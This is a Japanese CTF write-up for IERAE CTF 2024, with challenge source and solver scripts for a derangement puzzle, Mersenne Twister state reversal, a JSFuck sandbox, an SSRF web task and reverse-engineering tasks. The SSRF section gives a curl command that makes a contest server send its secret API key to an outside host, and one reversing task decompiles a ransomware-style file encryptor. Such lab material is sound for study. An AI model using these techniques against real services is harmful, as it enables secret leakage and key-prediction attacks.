---
title: "ieraeCTF2024"
date: 2024-09-22T19:25:49+09:00
draft: true
---

難易度が，めんどくささではなく純粋に技術をこねくりまわす難しさで達成されていて面白かったです．
競技中に解いたものと upsolve が混ざっています．

## misc

### OMG

アクセスすると ```Let's press the browser back button 33 times. / 戻るボタンを33回押そう！``` といわれている．
33 回なら普通に押せばいいのでは...?

```IERAE{Tr3ndy_4ds.LOL}```

ちなみに burp で javascript を見るとこんな感じ

```javascript
if (e.state.i == 0) {
     cntdwn.innerText = atob("SUVSQUV7VHIzbmR5XzRkcy5MT0x9");
     init();
 }
```

base64 でデコードすれば OK

### 5

送りつけた javascript ファイルを実行してくれるサンドボックス環境がある．
実行部分は以下のようになっている．

```javascript
@app.post("/run")
def run():
    if "file" not in request.files:
        return "Missing file parameter", 400
    file = request.files["file"]
    filename = secure_filename(file.filename or "")

    # A new JSFxxk challenge!
    content = file.read().decode()
    if len(set(content)) > 5:
        return "Too many characters :(", 400

    filepath = os.path.join(session["user_dir"], filename)
    open(filepath, "w").write(content)

    try:
        proc = subprocess.run(
            ["bun", filepath],
            capture_output=True,
            timeout=2,
        )
        if proc.returncode == 0:
            return "Result: " + proc.stdout.decode()
        else:
            return "Error"
    except subprocess.TimeoutExpired:
        return "Timeout"
```

bun で実行環境を作っているらしい．使ったことないな\
で，この問題で見るべきは使える文字種が 5 種類までであること

```javascript
if len(set(content)) > 5:
        return "Too many characters :(", 400
```

[JSFuck](https://qiita.com/shimgo2008/items/5aeaa977d2dbf11ae4ec) という言及がコメントに書いてあるので調べると，javascript は ```[]()!+``` だけでコードが書けることが知られているらしい．
これを 5 文字でやれということ？

## crypto

### derangement

```python
#!/usr/bin/env python

from os import getenv
import random
import string
import sys

FLAG = getenv("FLAG", "TEST{TEST_FLAG}")

LENGTH = 15
CHAR_SET = string.ascii_letters + string.digits + string.punctuation

def generate_magic_word(length=LENGTH, char_set=CHAR_SET):
    return ''.join(random.sample(char_set, length))

def is_derangement(perm, original):
    return all(p != o for p, o in zip(perm, original))

def output_derangement(magic_word):
    while True:
        deranged = ''.join(random.sample(magic_word, len(magic_word)))
        if is_derangement(deranged, magic_word):
            print('hint:', deranged)
            break

def guess_random(magic_word, flag):
    print('Oops, I spilled the beans! What is the magic word?')
    if input('> ') == magic_word:
        print('Congrats!\n', flag)
        return True
    print('Nope')
    return False

def main():
    magic_word = generate_magic_word()
    banner = """
/********************************************************\\
|                                                        |
|   Abracadabra, let's perfectly rearrange everything!   |
|                                                        |
\\********************************************************/
"""
    print(banner)
    connection_count = 0

    while connection_count < 300:
        print('type 1 to show hint')
        print('type 2 to submit the magic word')
        try:
            connection_count += 1
            user_input = int(input('> '))

            if user_input == 1:
                output_derangement(magic_word)
            elif user_input == 2:
                if guess_random(magic_word, FLAG):
                    break
                sys.exit()
            else:
                print('bye!')
                sys.exit()
        except:
            sys.exit(-1)
    
    print('Connection limit reached. Exiting...')

if __name__ == "__main__":
    main()
```

magic word を入力すれば正解になる．
magic word が何かは show hint で教えてくれるが，magic word をスクランブルされるのでよく分からない．
しかし，```return all(p != o for p, o in zip(perm, original))``` のように，正解の magic word にある文字と同じ位置に文字がこないようにしている．
なので，何回かヒントをリクエストして，一回も配置されなかった場所にその文字がくる，と考える．

```python
from pwn import *

tmp = []
ans = list(range(15))

for i in range(100):
    p.sendlineafter(b'> ', b"1")
    ret = (p.recvline().strip()).decode()[6:]
    tmp.append(ret)


num_strings = len(tmp)
string_length = len(tmp[0])

all_chars = set(''.join(tmp))

missing_chars_per_index = []

for i in range(string_length):
    chars_at_index = {string[i] for string in tmp}
    missing_chars = all_chars - chars_at_index
    missing_chars_per_index.append((i, missing_chars))


for index, missing_chars in missing_chars_per_index:
    ans[index] = next(iter(missing_chars))

print(ans)
ans = ''.join(ans)

p.sendlineafter(b'> ', b"2")
p.sendlineafter(b'> ', ans.encode())

p.recvline()
```

### Weak PRNG

```python
#!/usr/bin/env python

from os import getenv
import random
import secrets

FLAG = getenv("FLAG", "TEST{TEST_FLAG}")


def main():
    # Python uses the Mersenne Twister (MT19937) as the core generator.
    # Setup Random Number Generator
    rng = random.Random()
    rng.seed(secrets.randbits(32))

    secret = rng.getrandbits(32)

    print("Welcome!")
    print("Recover the initial output and input them to get the flag.")

    while True:
        print("--------------------")
        print("Menu")
        print("1. Get next 16 random data")
        print("2. Submit your answer")
        print("3. Quit")
        print("Enter your choice (1-3)")
        choice = input("> ").strip()

        if choice == "1":
            print("Here are your random data:")
            for _ in range(16):
                print(rng.getrandbits(32))
        elif choice == "2":
            print("Enter the secret decimal number")
            try:
                num = int(input("> ").strip())

                if num == secret:
                    print("Correct! Here is your flag:")
                    print(FLAG)
                else:
                    print("Incorrect number. Bye!")
                break
            except (ValueError, EOFError):
                print("Invalid input. Exiting.")
                break
        elif choice == "3":
            print("Bye!")
            break
        else:
            print("Invalid choice. Please enter 1, 2 or 3.")
            continue


if __name__ == "__main__":
    main()
```

メルセンヌツイスタの乱数予測．
次の乱数を予測するのかとずっと思っていたが，最初の乱数を求めるらしい．
過去の状態を予測すればいいということで以下．
マジ力技で恥ずかしい限りなので頭良くなりたい

```python
import random
from pwn import *
import time

def untemper(x):
...

def unBitshiftRightXor(x, shift):
...

def unBitshiftLeftXor(x, shift, mask):
...

def get_prev_state(state):
...

rands = [0] * 624
rands2 = [0]

for i in range(39):
    p.sendlineafter(b'> ', b"1")
    p.recvline().strip()
    for j in range(16):
        rands[j + 16*i] = int((p.recvline().strip()).decode(),10)
    #time.sleep(0.1)

rands[623] = rands2[0]

while len(rands2) < 624:
    p.sendlineafter(b'> ', b"1")
    p.recvline().strip()
    for _ in range(16):
        rand = int(p.recvline().strip().decode())
        rands2.append(rand)
    #time.sleep(0.1)

rands2 = rands2[:624]
rng = random.Random()

mt_state = [untemper(x) for x in rands2]

prev_mt_state = get_prev_state(mt_state)
rng.setstate((3, tuple(prev_mt_state + [0]), None))

predicted = rng.getrandbits(32)

print(predicted)

p.sendlineafter(b'> ', b"2")
p.sendlineafter(b'> ', str(predicted).encode())

p.recvline()
```

## Web

### Futari API

```ts
const FLAG: string = Deno.env.get("FLAG") || "IERAE{dummy}";
const USER_SEARCH_API: string = Deno.env.get("USER_SEARCH_API") ||
  "http://user-search:3000";
const PORT: number = parseInt(Deno.env.get("PORT") || "3000");

async function searchUser(user: string, userSearchAPI: string) {
  const uri = new URL(`${user}?apiKey=${FLAG}`, userSearchAPI);
  return await fetch(uri);
}

async function handler(req: Request): Promise<Response> {
  const url = new URL(req.url);
  switch (url.pathname) {
    case "/search": {
      const user = url.searchParams.get("user") || "";
      return await searchUser(user, USER_SEARCH_API);
    }
    default:
      return new Response("Not found.");
  }
}

Deno.serve({ port: PORT, handler });
```

これは frontend.ts で，user-search.ts にリクエストを送る．
細かい機能はよくて，frontend.ts が内部のサーバにリクエストを送る際に apiKey を付与しているが，この内容が FLAG になっている．
これを露出できればいい．
SSRF が通る．
```curl 'http://34.81.219.110:3000/search?user=http://example.com'```

## rev

### Assignment

Ghidra でデコンパイルすると以下のような感じ

```C
flag[28] = 0x33;
flag[1] = 0x45;
flag[2] = 0x52;
flag[20] = 0x72;
...
```

というように，ランダムな順番で flag を構成している．
これを元に戻せばいい．
復元には chatGPT を使った．

### Luz Da Lua

luac の [デコンパイラ](https://luadec.metaworm.site/)を使った．

```lua
if string.len(input) ~= 28 then
  goto label_301
elseif string.byte(input, 1) ~ 232 ~= 161 then
  goto label_301
elseif string.byte(input, 2) ~ 110 ~= 43 then
  goto label_301
elseif string.byte(input, 3) ~ 178 ~= 224 then
  goto label_301
elseif string.byte(input, 4) ~ 172 ~= 237 then
  goto label_301
...
```

というような感じで flag の条件が書かれているので，これを復元すれば OK．
復元には chatGPT を使った．

### The Kudryavka Sequence

氷菓懐かしい\
摩耶花いいっスよね

「フットサル部からフラグは既に奪われた」という十文字からの手紙が添付されている．

IDA でデコンパイルすると以下

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rax
  FILE *v4; // rax
  HANDLE ProcessHeap; // rax
  HANDLE v6; // rax
  unsigned int i; // [rsp+44h] [rbp-84h]
  unsigned int j; // [rsp+48h] [rbp-80h]
  HANDLE hFile; // [rsp+50h] [rbp-78h]
  LPCVOID lpBuffer; // [rsp+58h] [rbp-70h] BYREF
  LPVOID lpMem; // [rsp+60h] [rbp-68h] BYREF
  DWORD nNumberOfBytesToWrite; // [rsp+68h] [rbp-60h] BYREF
  ULONG cbInput; // [rsp+6Ch] [rbp-5Ch] BYREF
  struct _SYSTEMTIME SystemTime; // [rsp+70h] [rbp-58h] BYREF
  DWORD NumberOfBytesWritten; // [rsp+80h] [rbp-48h] BYREF
  _BYTE v17[16]; // [rsp+88h] [rbp-40h] BYREF
  _BYTE v18[32]; // [rsp+98h] [rbp-30h] BYREF

  memset(v18, 0, sizeof(v18));
  memset(v17, 0, sizeof(v17));
  lpMem = 0LL;
  cbInput = 0;
  sub_140001410(&lpMem, &cbInput, envp);
  sub_1400016E0();
  sub_1400018D0();
  GetLocalTime(&SystemTime);
  srand(
    SystemTime.wMilliseconds
  + 131243
  * (SystemTime.wSecond
   + 131243
   * (SystemTime.wMinute
    + 131243
    * (SystemTime.wHour
     + 131243
     * (SystemTime.wDay
      + 131243 * (SystemTime.wDayOfWeek + 131243 * (SystemTime.wMonth + 131243 * (SystemTime.wYear + 131243))))))));
  for ( i = 0; i < 0x20uLL; ++i )
    v18[i] = rand();
  for ( j = 0; j < 0x10uLL; ++j )
    v17[j] = rand();
  lpBuffer = 0LL;
  nNumberOfBytesToWrite = 0;
  sub_1400010D0((int)v18, 32, (int)v17, 16, (PUCHAR)lpMem, cbInput, (__int64)&lpBuffer, (__int64)&nNumberOfBytesToWrite);
  sub_140001650(lpBuffer, nNumberOfBytesToWrite);
  hFile = CreateFileW(L"flag.png.laika", 0x40000000u, 0, 0LL, 2u, 0x80u, 0LL);
  if ( hFile == (HANDLE)-1LL )
  {
    v3 = _acrt_iob_func(2u);
    sub_140001060(v3, "Error: CreateFile\n");
    exit(1);
  }
  if ( !WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0LL) )
  {
    v4 = _acrt_iob_func(2u);
    sub_140001060(v4, "Error: WriteFile\n");
    CloseHandle(hFile);
    exit(1);
  }
  CloseHandle(hFile);
  if ( lpBuffer )
  {
    ProcessHeap = GetProcessHeap();
    HeapFree(ProcessHeap, 0, (LPVOID)lpBuffer);
  }
  if ( lpMem )
  {
    v6 = GetProcessHeap();
    HeapFree(v6, 0, lpMem);
  }
  return 0;
}
```
